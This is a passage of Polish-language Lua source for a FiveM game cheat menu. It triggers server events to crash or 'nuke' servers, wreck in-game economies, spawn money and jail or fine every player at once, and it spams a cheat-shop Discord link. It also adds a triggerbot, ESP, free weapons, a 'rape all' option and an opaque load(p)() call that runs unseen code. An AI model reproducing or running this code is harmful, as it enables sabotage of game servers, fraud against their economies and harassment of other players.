                if KoGuSzEk.MB('~h~~p~»~w~ Rozpierdol', 'Destroyer') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ ESP Menu', 'ESPMenu') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Celowniki', 'CsMenu') then
                elseif
                    KoGuSzEk.c(
                        '~h~TriggerBot',
                        TriggerBot,
                        function(dR)
                            TriggerBot = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Oznaczenia graczy',
                        dx,
                        function(dx)
                        end
                    )
                 then
                    cL = not cL
                    dx = cL
                elseif
                    KoGuSzEk.c(
                        '~h~Nazwy graczy ~g~v1',
                        cM,
                        function(dR)
                            cM = dR
                            cN = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Id i nazwy graczy ~g~v2',
                        cN,
                        function(dR)
                            cN = dR
                            cM = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Zamroz~w~ Wszystkich graczy',
                        freezeall,
                        function(dR)
                            freezeall = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Wysadz~w~ Wszystkich graczy',
                        blowall,
                        function(dR)
                            blowall = dR
                        end
                    )
                 then
                elseif KoGuSzEk.B('~h~~r~Burgerek~w~ Wszystkim') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                pizda(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), false),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                pizda(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                true,
                                true,
                                false,
                                true,
                                1,
                                true
                            )
                        end
                    end
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Ra~g~nd~w~omowe ~w~kolory powiadomien',
                        rgbnot,
                        function(dR)
                            rgbnot = dR
                        end
                    )
                 then
                
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('CsMenu') then
                if
                    KoGuSzEk.c(
                        '~h~~y~Original ~w~Celownik',
                        crosshair,
                        function(dR)
                            crosshair = dR
                            crosshairc = false
                            crosshairc2 = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Zkrzyzowany celownik',
                        crosshairc,
                        function(dR)
                            crosshair = false
                            crosshairc = dR
                            crosshairc2 = false
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Kropka',
                        crosshairc2,
                        function(dR)
                            crosshair = false
                            crosshairc = false
                            crosshairc2 = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('Destroyer') then
                if KoGuSzEk.B('~h~~r~Wysadz ~w~Serwer') then
                    nukeserver()
                elseif 
                    KoGuSzEk.c(
                        '~h~~r~Cichy crasher',
                        servercrasherxd,
                        function(dR)
                            servercrasherxd = dR
                        end
                    )
                 then
                elseif KoGuSzEk.B('~h~~g~ESX ~r~Ekonomia ~w~v2') then
                    esxdestroyv2()
                elseif KoGuSzEk.B('~h~~g~ESX ~r~Rozpierdol ~w~ekonomie') then
                    EconomyDestroySalary1()
                elseif KoGuSzEk.B('~h~~g~ESX ~w~Daj wszystkim kase') then
                    giveeveryone()
                elseif KoGuSzEk.B('~h~~r~VRP ~w~Daj wszystkim kase') then
                    vrpdestroy()
                elseif KoGuSzEk.B('~h~~r~Zamknij~w~ Wszystkich graczy') then
                    for i = 0, 128 do
					TriggerServerEvent("arisonarp:mandat", GetPlayerServerId(i), 32323232323, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
						TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 321321312 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 424324234234)
						TriggerServerEvent("wyspa_jail:SendMessagetrop", GetPlayerServerId(i), 32135412521, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
                        TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 32513251 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 321321321321)
						TriggerServerEvent("esx_jailer:wyslijwiezienie", GetPlayerServerId(i), 3251 * 60, '^1Kochać skaze jebać ariesa | pozdro od bezia, buziaczki', 32513251)
						TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 3251 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY',3251)
						TriggerServerEvent("wyspa_jail:SendWiadomosc", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
						TriggerServerEvent("esx-qale-jail:jailPlayer", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY')
						TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 1 * 60, '', 32)
						TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 3251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY |')
						TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY' )
						TriggerServerEvent("esx_jailer:sendToJail2", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251 )
						TriggerServerEvent('esx_jailer:wysylandoo', 'Garbary123')
						TriggerServerEvent("esx_jailer:wysylanko", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("esx_jailer:wysylandoo", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251, 'Garbary123')
                        TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251 )
                       TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3https://discord.gg/UC9HrnY', 32513251)
					   TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 3251 * 60)
                      TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 80000 * 60, 'https://discord.gg/UC9HrnY')
                    end
                elseif KoGuSzEk.B('~h~~y~Bananuj Wszystkich Graczy') then
                    bananapartyall()
                elseif KoGuSzEk.B('~h~~r~Wyruchaj~w~ Wszystkich Graczy') then
                    RapeAllFunc()
                elseif KoGuSzEk.B('~h~~r~Cage~w~ Wszystkich graczy') then
                    for i = 0, 255 do
                        x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i)))
                        roundx = tonumber(string.format('%.2f', x))
                        roundy = tonumber(string.format('%.2f', y))
                        roundz = tonumber(string.format('%.2f', z))
                        while not HasModelLoaded(GetHashKey('prop_fnclink_05crnr1')) do
                            Citizen.Wait(0)
                            pizda(GetHashKey('prop_fnclink_05crnr1'))
                        end
                        local e9 =
                            CreateObject(
                            GetHashKey('prop_fnclink_05crnr1'),
                            roundx - 1.70,
                            roundy - 1.70,
                            roundz - 1.0,
                            true,
                            true,
                            false
                        )
                        local ea =
                            CreateObject(
                            GetHashKey('prop_fnclink_05crnr1'),
                            roundx + 1.70,
                            roundy + 1.70,
                            roundz - 1.0,
                            true,
                            true,
                            false
                        )
                        SetEntityHeading(e9, -90.0)
                        SetEntityHeading(ea, 90.0)
                        FreezeEntityPosition(e9, true)
                        FreezeEntityPosition(ea, true)
                    end
                end
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('kogusz') then
                if KoGuSzEk.MB('~h~~p~»~w~ ~r~ESX ~w~Triggery', 'esxy') then
				elseif KoGuSzEk.MB('~h~~p~»~w~ Dzwieki', 'dzwieki') then
				elseif KoGuSzEk.MB('~h~~p~»~w~ RichRP', 'richrp') then
				elseif KoGuSzEk.MB('~h~~p~»~w~ WioskaRP', 'wioskarp') then
				elseif KoGuSzEk.MB('~h~~p~»~w~ PedMenu', 'pedy') then
				elseif KoGuSzEk.MB('~h~~p~»~w~ Pogoda menu', 'pogoda') then
				elseif KoGuSzEk.MB('~h~~p~»~w~ Itemy', 'itemy') then
				elseif KoGuSzEk.B('~h~~p~ Zresp rampe pod glownym') then
				x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    local e8 = -145066854
                    RequestModel(e8)
                    while not HasModelLoaded(e8) do
                        Citizen.Wait(0)
                    end
                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, waduyh487r64, waduyh487r64, KZjx)
                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, waduyh487r64, waduyh487r64, KZjx)
					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, waduyh487r64, waduyh487r64, KZjx)
					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, waduyh487r64, waduyh487r64, KZjx)
                    SetEntityHeading(e9, 158.41)
                    SetEntityHeading(ea, 90.51)
					SetEntityHeading(e92, 332.41)
                    SetEntityHeading(ea2, 260.51)
                    FreezeEntityPosition(e9, waduyh487r64)
                    FreezeEntityPosition(ea, waduyh487r64)
					FreezeEntityPosition(e92, waduyh487r64)
                    FreezeEntityPosition(ea2, waduyh487r64)
					elseif
                    KoGuSzEk.c(
                        '~h~~r~Chat Spam',
                        koguszspam,
                        function(dR)
                            crosshair = false
                            crosshairc = false
                            koguszspam = dR
                        end
                    )
                 then
				end
				
				
                
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('pogoda') then
					
				
				if KoGuSzEk.B("Ustaw noc") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif KoGuSzEk.B("Ustaw dzien") then
				NetworkOverrideClockTime(12, 12, 0)
				

                end
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('dzwieki') then
                if KoGuSzEk.B('~h~~p~~w~Dzwiek ~y~zamykania auta') then
						TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 103232, "lock", 1.0)	
				elseif KoGuSzEk.B('~h~~g~Dzwiek ~w~Kajdanek~w~') then
						TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 10000, 'handcuff', 1.0)
						TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 10000, 'Cuff', 1.0)
						TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 10000, 'cuffs', 1.0)
						TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 10000, 'cuffseffect', 1.0)
				elseif KoGuSzEk.B('~h~~g~Dzwiek ~w~Pasow~w~') then		
						TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 13232, 'pasysound', 1.0)
				

                end
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('itemy') then
                if KoGuSzEk.B('~h~~w~Pickup ~g~Cannabis') then
                    pickupcannabis()
                elseif KoGuSzEk.B('~h~~w~Process ~g~Cannabis') then
                    proccesscannabis()
                elseif KoGuSzEk.B('~h~~w~Harvest ~g~Weed') then
                    hweed()
                elseif KoGuSzEk.B('~h~~w~Transform ~g~Weed') then
                    tweed()
                elseif KoGuSzEk.B('~h~~w~Sell ~g~Weed') then
                    sweed()
                elseif KoGuSzEk.B('~h~~w~Harvest ~w~Coke') then
                    hcoke()
                elseif KoGuSzEk.B('~h~~w~Transform ~w~Coke') then
                    tcoke()
                elseif KoGuSzEk.B('~h~~w~Sell ~w~Coke') then
                    scoke()
                elseif KoGuSzEk.B('~h~~w~Harvest ~w~Meth') then
                    hmeth()
                elseif KoGuSzEk.B('~h~~w~Transform ~w~Meth') then
                    tmeth()
                elseif KoGuSzEk.B('~h~~w~Sell ~w~Meth') then
                    smeth()
                elseif KoGuSzEk.B('~h~~w~Harvest ~r~Opium') then
                    hopi()
                elseif KoGuSzEk.B('~h~~w~Transform ~r~Opium') then
                    topi()
                elseif KoGuSzEk.B('~h~~w~Sell ~r~Opium') then
                    sopi()
                elseif KoGuSzEk.B('~h~~w~Sell ~r~Drugs ~w~to ~g~NPC') then
                    snpc()
                elseif KoGuSzEk.B('~h~~w~Wash ~g~Money') then
                    mataaspalarufe()
                elseif KoGuSzEk.B('~h~~w~Harvest ~y~Bitcoin') then
                    harvestbitcoin()
                elseif KoGuSzEk.B('~h~~w~Sell ~y~Bitcoin') then
                    sellbitcoin()
                elseif KoGuSzEk.B('~h~~w~Harvest ~p~Gaz Bottle') then
                    harvestgazbottle()
                elseif KoGuSzEk.B('~h~~w~Craft ~p~Gaz Bottle') then
                    craftgazbottle()
                elseif KoGuSzEk.B('~h~~w~Harvest ~p~Repair Kit') then
                    harvestrepairkits()
                elseif KoGuSzEk.B('~h~~w~Craft ~p~Repair Kit') then
                    craftrepairkits()
                elseif KoGuSzEk.B('~h~~w~Harvest ~p~Body Kit') then
                    harvestbodykits()
                elseif KoGuSzEk.B('~h~~w~Craft ~p~Body Kit') then
                    craftbodykits()
                elseif KoGuSzEk.B('~h~~r~Hunting ~w~Reward') then
                    TriggerServerEvent('esx-qalle-hunting:reward', 50)
                elseif KoGuSzEk.B('~h~~w~Stop All') then
                    matanumaispalarufe()
                elseif
                    KoGuSzEk.c(
                        '~h~~y~Spam dragami ~r~UWAGA!',
                        BlowDrugsUp,
                        function(dR)
                            BlowDrugsUp = dR
                        end
                    )
                 then
                end
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('wioskarp') then
                if KoGuSzEk.B('~h~~p~»~w~Mandat najblizszego gracza ') then
                    TriggerServerEvent("wyspa_jail:SendWiadomosc", GetPlayerServerId(closestPlayer), 200000, '^1Chcesz kupic cheaty? ^3Pisz do ^5KoGuSzEk^7#^53251 ^1 Sory za mandat mordo ale to nie ja to gosciu uzywa mojego menu' )
                elseif KoGuSzEk.B('~h~~p~»~w~Wygrana zdrapki *tost*  ') then
					TriggerServerEvent("tostzdrapka:wygranko")
				elseif KoGuSzEk.B('~h~~p~»~w~Pranie pieniedzy x10000  ') then
				local dB =keyboardinput('Wpisz ilosc', '', 100000000)
					TriggerServerEvent('esx_moneywash:washMoney', dB)
				end
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('pedy') then
			
                if KoGuSzEk.B("Zresp A ~y~Jelenia ~s~i jezdzij na nim") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif KoGuSzEk.B("Zmien w ~y~Trevora") then
			Deer.Destroy()
		Wait(100)
				local keduxben13 = Ggggg("player_two")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben13)
    while not HasModelLoaded(keduxben13) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben1)
				elseif KoGuSzEk.B("Zmien w ~r~mopsa") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_pug")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~golebia") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_pigeon")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~grubasa") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_m_m_afriamer_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~dzika") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_boar")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
					elseif KoGuSzEk.B("Zmien w ~r~pudla") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_poodle")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
					elseif KoGuSzEk.B("Zmien w ~r~malpe") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_chimp")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
						elseif KoGuSzEk.B("Zmien w ~r~walenia") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_humpback")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~kosmite") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("s_m_m_movalien_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~wielka stope") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("ig_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
					elseif KoGuSzEk.B("Zmien w ~r~jezusa") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("u_m_m_jesus_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~pume") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_mtlion")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~grubasa v2") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_m_m_genfat_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~zombie") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("u_m_y_zombie_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w ~r~ksiedza") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("ig_priest")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
					elseif KoGuSzEk.B("Zmien w ~r~miesniaka") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("u_m_y_babyd")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)		
						elseif KoGuSzEk.B("Zmien w ~r~kota") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_cat_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
								elseif KoGuSzEk.B("Zmien w ~r~policjanta") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("s_m_y_cop_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
	
									elseif KoGuSzEk.B("Zmien w ~r~gruba babe") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_f_m_fatcult_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
						elseif KoGuSzEk.B("Zmien w ~r~szczura") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("a_c_rat")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
						elseif KoGuSzEk.B("Zmien w ~r~robota") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("u_m_y_juggernaut_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
							elseif KoGuSzEk.B("Zmien w ~r~terroryste") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("mp_m_bogdangoon")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
			elseif KoGuSzEk.B("Zmien w ~r~strazak") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("s_m_y_fireman_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
			elseif KoGuSzEk.B("Zmien w ~r~strazak") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("s_m_y_fireman_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1) 
				
    pizda(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
				elseif KoGuSzEk.B("Zmien w  ~b~Michaela") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("player_zero")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    pizda(keduxben12)
    while not HasModelLoaded(keduxben12) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben12)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
							elseif KoGuSzEk.B("Zmien w  ~r~Coyota") then
			
			load(p)()
				end   
				KoGuSzEk.Display() 
            elseif KoGuSzEk.IsMenuOpened('richrp') then
                if KoGuSzEk.B('~h~~p~~w~Sprzedawanie narko ~y~lokalsom') then
						TriggerServerEvent("tostdrugs:udanyzakup", playerX, playerY, playerZ)	
				elseif KoGuSzEk.B('~h~~g~Pranie ~w~Pieniedzy ~w~') then
				local dB =keyboardinput('Wpisz ilosc', '', 100000000)
						TriggerServerEvent('esx_moneywash:washMoney', dB)
				elseif KoGuSzEk.B('~h~~g~Dodawanie ~w~Pieniedzy~w~') then		
						local dB =keyboardinput('Wpisz ilosc', '', 100000000)
						TriggerServerEvent("esx_garbagejobb:payy", dB)
				elseif KoGuSzEk.B('~h~~g~Plasterek ~w~~w~') then			
						TriggerServerEvent('esx_ambulancejob:heal', 'big', true)
				elseif KoGuSzEk.B('~h~~g~Zdrapka ~w~~w~') then		
						TriggerServerEvent('zdrapka:open')
				elseif KoGuSzEk.B('~h~~g~Pracowanie wiezienie ~w~~w~') then	
						
						TriggerServerEvent("pNotify:SetQueueMax", "work", 20)
				end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('crds') then
                if KoGuSzEk.B('~h~~p~»~w~ KoGuSzEk~r~#3251 ~p~DEV') then
                    av('~h~~o~Beziu to ulana kurwa!~w~.', true)
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('WeaponTypes') then
                for e0, ev in pairs(b7) do
                    if KoGuSzEk.MB('~h~~p~»~w~ ' .. e0, 'WeaponTypeSelection') then
                        dy = ev
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('WeaponTypeSelection') then
                for e0, ev in pairs(dy) do
                    if KoGuSzEk.MB(ev.name, 'WeaponOptions') then
                        dz = ev
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('WeaponOptions') then
                if KoGuSzEk.B('~h~~r~Zresp bron') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                end
                if KoGuSzEk.B('~h~~g~Dodaj ammunicje') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
                end
                if
                    KoGuSzEk.c(
                        '~h~~r~Nieskonczona ~w~Amunicja',
                        dz.bInfAmmo,
                        function(ew)
                        end
                    )
                 then
                    dz.bInfAmmo = not dz.bInfAmmo
                    SetPedInfiniteAmmo(GetPlayerPed(-1), dz.bInfAmmo, GetHashKey(dz.id))
                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
                    PedSkipNextReloading(GetPlayerPed(-1))
                    SetPedShootRate(GetPlayerPed(-1), 1000)
                end
                for e0, ev in pairs(dz.mods) do
